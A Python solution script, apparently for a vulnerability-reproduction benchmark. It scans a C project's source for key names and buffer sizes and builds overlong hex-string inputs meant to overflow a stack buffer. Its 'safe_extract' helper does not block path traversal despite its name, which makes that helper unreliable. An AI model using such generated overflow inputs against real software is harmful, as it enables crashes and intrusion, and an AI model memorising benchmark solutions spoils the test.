import os
import tarfile
import tempfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract tarball if possible
        extract_dir = None
        try:
            extract_dir = tempfile.mkdtemp(prefix="pocgen_")
            with tarfile.open(src_path, "r:*") as tar:
                def is_within_directory(directory, target):
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    return prefix == abs_directory
                def safe_extract(tar_obj, path=".", members=None, *, numeric_owner=False):
                    for member in tar_obj.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            continue
                    tar_obj.extractall(path, members=members, numeric_owner=numeric_owner)
                safe_extract(tar, extract_dir)
        except Exception:
            extract_dir = None

        # Heuristically scan for candidate keys and hex buffer sizes
        candidate_keys = []
        sep_preferences = set()
        hex_related_files = set()
        buffer_sizes = []

        def add_key(k: str, weight: int):
            # maintain unique keys with preference for higher weights
            nonlocal candidate_keys
            for i, (ek, ew) in enumerate(candidate_keys):
                if ek == k:
                    if weight > ew:
                        candidate_keys[i] = (k, weight)
                    return
            candidate_keys.append((k, weight))

        # preferred patterns to recognize 'hex' related features
        hex_keywords = [
            'hex', 'HEX', 'Hex',
            'color', 'colour', 'Colour', 'COLOR',
            'hash', 'Hash', 'HASH',
            'signature', 'Signature', 'SIGNATURE', 'sig', 'Sig', 'SIG',
            'key', 'Key', 'KEY',
            'addr', 'address', 'Address', 'ADDRESS',
            'id', 'Id', 'ID',
            'guid', 'uuid', 'GUID', 'UUID',
            'salt', 'Salt', 'SALT',
        ]

        # default hex length
        hex_len = 512

        if extract_dir:
            # collect source files
            src_files = []
            for root, _, files in os.walk(extract_dir):
                for fn in files:
                    if fn.endswith((".c", ".h", ".cpp", ".hpp", ".cc", ".cxx", ".ipp")):
                        src_files.append(os.path.join(root, fn))

            # scan files for hints
            for fpath in src_files:
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue

                # Track files that likely parse hex
                if re.search(r'isxdigit\s*\(|0x[0-9A-Fa-f]|[Xx][0-9A-Fa-f]{2}', text):
                    hex_related_files.add(fpath)

                # Detect separators used
                if re.search(r'[^=!<>]=[^=]', text):
                    sep_preferences.add('=')
                if ':' in text:
                    sep_preferences.add(':')
                # space separator detection via sscanf/strtok patterns
                if re.search(r'sscanf\s*\([^,]+,\s*"[^"]*\s%s\s[^"]*"', text):
                    sep_preferences.add(' ')
                if re.search(r'strtok\s*\([^,]+,\s*"\s+"', text):
                    sep_preferences.add(' ')

                # Extract string literals from strcmp/strcasecmp/strncmp patterns (likely keys)
                for m in re.finditer(r'str(?:n?case)?cmp\s*\(\s*[^,]+,\s*"([^"\n]{1,64})"\s*\)', text):
                    tok = m.group(1)
                    if 1 <= len(tok) <= 48 and re.match(r'^[A-Za-z0-9_\-\.]+$', tok):
                        weight = 1
                        for kw in hex_keywords:
                            if kw in tok:
                                weight += 5
                        add_key(tok, weight)

                # Extract other string literals and consider if they look like keys
                for m in re.finditer(r'"((?:\\.|[^"\\]){1,64})"', text):
                    s = m.group(1)
                    if 1 <= len(s) <= 32 and re.match(r'^[A-Za-z0-9_\-\.]+$', s):
                        weight = 0
                        for kw in hex_keywords:
                            if kw in s:
                                weight += 3
                        if weight > 0:
                            add_key(s, weight)

            # Determine buffer size heuristic from hex-related files
            for fpath in hex_related_files:
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                # find stack buffers possibly used for hex strings
                for m in re.finditer(r'\bchar\s+\w+\s*\[\s*(\d+)\s*\]', text):
                    size = int(m.group(1))
                    # ignore too small or too large
                    if 8 <= size <= 2048:
                        buffer_sizes.append(size)
                # macros defining sizes
                for m in re.finditer(r'#\s*define\s+\w*(?:HEX|BUF|LEN|SIZE)\w*\s+(\d+)', text):
                    try:
                        size = int(m.group(1))
                    except Exception:
                        continue
                    if 8 <= size <= 4096:
                        buffer_sizes.append(size)

            if buffer_sizes:
                # choose a size that likely corresponds to the hex buffer; use min to be conservative
                min_size = min(buffer_sizes)
                # If they parse ASCII hex into a char[] buffer, overflow occurs around buffer size.
                # To ensure overflow, use several times the size but cap to reasonable amount.
                # If they parse into bytes from hex, each output byte requires 2 hex chars: double.
                # We'll choose 4x size for safety, but at least 512 and at most 4096.
                hex_len = max(512, min(4096, min_size * 4))

        # Choose separator preference: prioritize '=' then ':' then ' '
        sep = '='
        if sep_preferences:
            if '=' in sep_preferences:
                sep = '='
            elif ':' in sep_preferences:
                sep = ':'
            else:
                sep = ' '

        # Choose a candidate key
        chosen_key = None
        if candidate_keys:
            # sort by weight descending, prefer ones with 'hex' inside
            candidate_keys.sort(key=lambda kv: (kv[1], ('hex' in kv[0].lower())), reverse=True)
            chosen_key = candidate_keys[0][0]

        # Fallback to generic key
        if not chosen_key:
            chosen_key = "hex"

        # Build hex strings
        # Use even number of hex digits to satisfy parsers requiring pairs
        if hex_len % 2 != 0:
            hex_len += 1
        long_hex = "A" * hex_len
        # Provide both 0x and plain variants
        hx_prefixed = "0x" + long_hex
        HX_prefixed = "0X" + long_hex

        # Construct PoC with multiple representations to maximize parser compatibility
        lines = []

        # Primary: selected key with preferred separator
        if sep == ' ':
            lines.append(f"{chosen_key} {hx_prefixed}")
        else:
            lines.append(f"{chosen_key}{sep}{hx_prefixed}")

        # Variants with other separators
        for alt_sep in (':', ' ', '='):
            if alt_sep != sep:
                if alt_sep == ' ':
                    lines.append(f"{chosen_key} {HX_prefixed}")
                else:
                    lines.append(f"{chosen_key}{alt_sep}{HX_prefixed}")

        # Uppercase key variant if not already
        upper_key = chosen_key.upper()
        if upper_key != chosen_key:
            lines.append(f"{upper_key}={hx_prefixed}")

        # Lowercase key variant
        lower_key = chosen_key.lower()
        if lower_key != chosen_key:
            lines.append(f"{lower_key}:{HX_prefixed}")

        # Raw hex-only line
        lines.append(hx_prefixed)

        # Add a plain long hex without 0x (some parsers expect pure hex)
        lines.append(long_hex)

        # Assemble content ensuring it is not excessively long
        # Limit to a maximum of ~5KB to avoid unnecessary overhead
        content = ""
        size_limit = 5 * 1024
        for line in lines:
            if len(content) + len(line) + 1 > size_limit:
                break
            content += line + "\n"

        # Ensure at least something is produced
        if not content:
            # default fallback: near ground-truth length single line
            content = "0x" + ("A" * 545)

        return content.encode("ascii", errors="ignore")